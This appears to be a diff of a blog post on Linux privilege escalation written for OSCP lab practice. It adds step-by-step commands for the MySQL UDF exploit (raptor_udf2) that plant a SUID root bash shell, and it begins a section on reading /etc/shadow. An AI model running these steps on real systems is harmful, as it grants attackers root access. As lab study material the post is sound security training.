@@ -33,7 +33,7 @@
                             "url": "https:\/\/example.com\/linuxprivsec\/featured-image.png",
                             "width":  389 ,
                             "height":  159 
-                        }],"genre": "posts","keywords": "linux","wordcount":  1425 ,
+                        }],"genre": "posts","keywords": "linux","wordcount":  1630 ,
         "url": "https:\/\/example.com\/linuxprivsec\/","datePublished": "2021-05-02T17:55:28+08:00","dateModified": "2021-05-03T17:55:28+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -119,8 +119,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Linux Privelege Escalation</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/gr4n173" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/oscp/"><i class="far fa-folder fa-fw"></i>OSCP Prepration</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-02">2021-05-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1425 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;<span id="/linuxprivsec/" class="leancloud_visitors" data-flag-title="Linux Privelege Escalation">
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-02">2021-05-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1630 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;<span id="/linuxprivsec/" class="leancloud_visitors" data-flag-title="Linux Privelege Escalation">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
         </div><div class="featured-image"><img
@@ -186,8 +186,73 @@
 <a href="https://github.com/sagishahar/lpeworkshop">https://github.com/sagishahar/lpeworkshop</a></p>
 <h2 id="1-service-exploits">1. Service Exploits</h2>
 <h3 id="mysql">mysql</h3>
-<p>Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the <code>command</code> using function.</p>
-<h2 id="2-week-file-permission">2. Week file permission</h2>
+<p>Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the <code>command</code> using function.
+The MySQL service is running as root and the &ldquo;root&rdquo; user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.</p>
+<p>Change into the /home/user/tools/mysql-udf directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ <span class="nb">cd</span> /home/user/tools/mysql-udf
+</code></pre></td></tr></table>
+</div>
+</div><p>Compile the <code>raptor_udf2.c</code> exploit code using the following commands:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ gcc -g -c raptor_udf2.c -fPIC
+root@gr4n173:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</code></pre></td></tr></table>
+</div>
+</div><p>Connect to the MySQL service as the root user with a blank password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ mysql -u root
+</code></pre></td></tr></table>
+</div>
+</div><p>Execute the following commands on the MySQL shell to create a User Defined Function (UDF) <code>&quot;do_system&quot;</code> using our compiled exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; use mysql<span class="p">;</span>
+mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;</span><span class="o">))</span><span class="p">;</span>
+mysql&gt; <span class="k">select</span> * from foo into dumpfile <span class="s1">&#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;</span><span class="p">;</span>
+mysql&gt; create <span class="k">function</span> do_system returns integer soname <span class="s1">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">mysql&gt; select do_system(&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;);
+</code></pre></td></tr></table>
+</div>
+</div><p>Exit out of the MySQL shell (type <code>exit</code> or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ /tmp/rootbash -p
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="2-week-file-permission">2. Week file permission</h2>
 <h3 id="readable">Readable</h3>
 <p>#/etc/shadow
 Here I will be exploiting the shadow file which have read permission.
